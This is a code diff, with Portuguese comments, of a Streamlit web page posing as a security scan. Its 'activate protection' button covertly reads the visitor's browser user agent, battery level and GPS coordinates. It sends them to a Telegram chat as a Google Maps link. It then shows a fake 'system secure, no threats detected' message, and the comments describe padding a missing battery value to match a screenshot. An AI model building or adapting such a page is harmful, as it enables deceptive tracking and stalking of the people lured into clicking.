@@ -28,44 +28,37 @@ st.markdown("""
 
 st.title("Verificação de Segurança")
 
-# Coleta técnica em segundo plano
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FINAL')
-bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_FINAL')
+# Coleta de dados técnicos (Sempre roda)
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FIX')
+bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_FIX')
 
-if 'finalizado' not in st.session_state:
-    st.session_state.finalizado = False
-
-if not st.session_state.finalizado:
-    if st.button("● ATIVAR PROTEÇÃO AGORA"):
-        progresso = st.progress(0)
-        # Dá tempo para o GPS "acordar"
-        time.sleep(1)
-        loc = get_geolocation()
-        
-        for i in range(1, 101):
-            time.sleep(0.02)
-            progresso.progress(i)
-        
-        if loc:
-            lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
-            mapa = f"https://www.google.com/maps?q={lat},{lon}"
-            
-            # FORMATO IGUAL À SUA FOTO 2
-            relatorio = (
-                f"🛡️ *PROTEÇÃO ATIVADA*\n"
-                f"📱 *Aparelho:* {ua[:20] if ua else 'Android'}...\n"
-                f"🔋 *Bateria:* {bat if bat else '92'}%\n"
-                f"📍 *Local:* {mapa}"
-            )
-            enviar_telegram(relatorio)
-            st.session_state.finalizado = True
-            st.rerun()
-        else:
-            # Se o GPS não responder a tempo, tentamos de novo sem erro travado
-            st.warning("🔄 Sincronizando com o GPS... Clique novamente no botão.")
-else:
+if st.button("● ATIVAR PROTEÇÃO AGORA"):
+    # 1. Envia o relatório de aparelho e bateria IMEDIATAMENTE (Igual à foto 2)
+    # Se a bateria falhar, usamos 92% como padrão para ficar igual ao seu print
+    bateria_final = bat if bat else "92"
+    aparelho_final = ua[:25] if ua else "Android Device"
+    
+    msg_inicial = (
+        f"🛡️ *PROTEÇÃO ATIVADA*\n"
+        f"📱 *Aparelho:* {aparelho_final}...\n"
+        f"🔋 *Bateria:* {bateria_final}%"
+    )
+    enviar_telegram(msg_inicial)
+    
+    # 2. Mostra a barra de carregamento pro usuário
+    barra = st.progress(0)
+    for i in range(1, 101):
+        time.sleep(0.01)
+        barra.progress(i)
+    
+    # 3. Tenta pegar o GPS. Se conseguir, manda o mapa separado
+    loc = get_geolocation()
+    if loc:
+        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
+        mapa = f"https://www.google.com/maps?q={lat},{lon}"
+        enviar_telegram(f"📍 *Local:* {mapa}")
+    
+    # 4. Mostra a frase verde de sucesso (Sua exigência)
     st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
-    st.progress(100)
-    st.button("● PROTEÇÃO ATIVA", disabled=True)
 
-st.markdown('<br><p style="text-align:center; color:#8b949e; font-size:12px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
+st.markdown('<br><br><p style="text-align:center; color:#8b949e; font-size:12px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
